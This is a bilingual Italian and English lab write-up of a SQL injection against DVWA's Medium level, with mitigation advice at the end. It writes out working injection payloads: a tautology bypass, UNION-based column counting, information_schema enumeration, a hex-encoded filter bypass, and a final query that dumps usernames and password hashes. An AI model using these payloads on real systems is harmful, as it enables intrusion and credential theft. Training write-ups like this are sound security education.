
## SQL Injection – Livello Medium (Italiano)

## Descrizione

Nel livello "Medium" di DVWA, l'applicazione riceve un parametro `id` via `POST` e restituisce il nome e cognome associato a quell'ID.  
A differenza del livello Low, qui è presente una sanitizzazione parziale, ma insufficiente. È comunque possibile eseguire una SQL Injection con tecniche più raffinate.

## Obiettivo

Ottenere tutti gli username e password memorizzati nella tabella `users`, sfruttando la vulnerabilità SQLi.

## Ambiente di test

- DVWA livello: Medium  
- VirtualBox  
- Browser: Firefox  
- Burp Suite (Proxy e Repeater)

## Fasi dell'attacco

### 1. Individuazione della vulnerabilità

Intercettando la richiesta `POST` con Burp Suite, si individuano i parametri `id` e `submit`.  
Modificando `id` nel Repeater e inserendo il payload:

```sql
1 OR 1=1 #
```

→ Il server risponde mostrando i dati di tutti gli utenti.

Nel codice HTML sono visibili i **5 nomi e cognomi**, confermando l’avvenuto bypass.

---

### 2. Verifica del numero di colonne

Con il payload:

```sql
1 UNION SELECT NULL, NULL #
```

la risposta non mostra errore → la query accetta **2 colonne visibili**.

---

### 3. Estrazione dei nomi delle tabelle

Payload utilizzato:

```sql
1 UNION SELECT table_name, NULL FROM information_schema.tables #
```

Il server restituisce vari nomi di tabella, tra cui `users`.

---

### 4. Estrazione dei nomi delle colonne

Il payload testato inizialmente con:

```sql
1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' #
```

non funziona per via del filtro sul carattere `'`.  
La soluzione è usare il nome della tabella in esadecimale:

```sql
1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name=0x7573657273 #
```

Risultato: sono visibili le colonne `user` e `password`.

---

### 5. Esfiltrazione dei dati

Payload finale:

```sql
1 UNION SELECT user, password FROM users #
```

Il server restituisce correttamente tutti gli username e password hashate.

> ⚠️ I dati estratti non vengono riportati per motivi etici.

---

## Considerazioni finali

Il livello Medium introduce dei filtri superficiali, ma rimane vulnerabile.  
Aggirando la sanitizzazione tramite encoding esadecimale e conoscenza delle strutture del DBMS, l'attacco SQLi risulta comunque efficace.

---

## Mitigazioni consigliate

Per prevenire la vulnerabilità SQL Injection, è fondamentale adottare le seguenti misure:

- Utilizzare **query parametrizzate** (prepared statements)  
- Evitare concatenazioni dirette di input utente  
- Validare e sanificare tutti i dati ricevuti dall’esterno  
- Limitare i privilegi dell’utente DB  
- Monitorare le richieste sospette lato server

---
---

## SQL Injection – Medium Level (English)

## Description

In the Medium level of DVWA, the application receives a parameter `id` via `POST` and returns the first and last name of the corresponding user.  
Unlike the Low level, partial sanitization is applied—but it's still insufficient.

## Objective

Retrieve all usernames and passwords stored in the `users` table by exploiting SQL Injection.

## Test environment

- DVWA level: Medium  
- VirtualBox  
- Firefox browser  
- Burp Suite (Proxy and Repeater)

## Attack steps

### 1. Finding the vulnerability

The `POST` request is intercepted using Burp Suite.  
By modifying the `id` parameter with:

```sql
1 OR 1=1 #
```

→ The server returns all users' names.

Viewing the HTML reveals 5 full names, confirming successful injection.

---

### 2. Column count check

Payload used:

```sql
1 UNION SELECT NULL, NULL #
```

→ No error returned → the query accepts **2 visible columns**.

---

### 3. Extracting table names

Payload used:

```sql
1 UNION SELECT table_name, NULL FROM information_schema.tables #
```

→ The list of tables includes `users`.

---

### 4. Extracting column names

Initial payload using `'users'` fails due to filtering.  
Hexadecimal encoding is used instead:

```sql
1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name=0x7573657273 #
```

→ The response shows `user` and `password` as valid columns.

---

### 5. Extracting user credentials

Final payload:

```sql
1 UNION SELECT user, password FROM users #
```

→ All usernames and password hashes are successfully displayed.

> ⚠️ Extracted data is intentionally omitted for ethical reasons.

---

## Final thoughts

The Medium level adds superficial filtering, but remains vulnerable.  
By bypassing basic sanitization using hexadecimal encoding and SQL structure knowledge, SQLi is still possible and effective.

---

## Recommended mitigation

To prevent SQL Injection vulnerabilities, apply the following best practices:

- Use **parameterized queries** (prepared statements)  
- Avoid direct concatenation of user input  
- Always validate and sanitize external data  
- Limit database user privileges  
- Monitor suspicious requests on the server side
